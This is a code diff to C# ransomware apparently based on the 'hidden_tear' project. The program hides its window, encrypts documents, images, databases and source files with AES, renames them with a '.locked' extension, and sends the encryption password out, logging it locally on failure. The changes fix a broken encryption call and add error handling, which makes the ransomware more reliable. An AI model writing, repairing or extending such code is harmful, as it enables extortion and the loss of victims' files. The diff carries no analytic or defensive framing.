@@ -58,7 +58,6 @@ namespace hidden_tear
         {
             Opacity = 0;
             this.ShowInTaskbar = false;
-            // Starts encryption at form load
             startAction();
         }
 
@@ -66,8 +65,6 @@ namespace hidden_tear
         {
             Visible = false;
             Opacity = 100;
-            //For testing, log to a file instead
-            //File.AppendAllText("log.txt", $"Password: {info}\n");
         }
 
         // AES encryption algorithm
@@ -81,13 +78,10 @@ namespace hidden_tear
                 {
                     AES.KeySize = 256;
                     AES.BlockSize = 128;
-
                     var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                     AES.Key = key.GetBytes(AES.KeySize / 8);
                     AES.IV = key.GetBytes(AES.BlockSize / 8);
-
                     AES.Mode = CipherMode.CBC;
-
                     using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                     {
                         cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
@@ -128,8 +122,14 @@ namespace hidden_tear
             catch (WebException ex)
             {
                 Console.WriteLine("Failed to send password: " + ex.Message);
-                // For testing, log to a file instead
-                File.AppendAllText("log.txt", $"Password: {info}\n");
+                try
+                {
+                    File.AppendAllText("log.txt", $"Password: {info}\n");
+                }
+                catch (Exception logEx)
+                {
+                    Console.WriteLine($"Failed to log password: {logEx.Message}");
+                }
             }
         }
 
@@ -144,7 +144,7 @@ namespace hidden_tear
                 {
                     passwordBytes = sha256.ComputeHash(passwordBytes);
                 }
-                byte[] bytesEncrypted = AES_Encrypt(bytesTojabberwocky, password);
+                byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
                 string tempFile = file + ".tmp";
                 File.WriteAllBytes(tempFile, bytesEncrypted);
                 File.Move(tempFile, file + ".locked");
@@ -162,7 +162,6 @@ namespace hidden_tear
             {
                 ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
             };
-
             try
             {
                 string[] files = Directory.GetFiles(location);
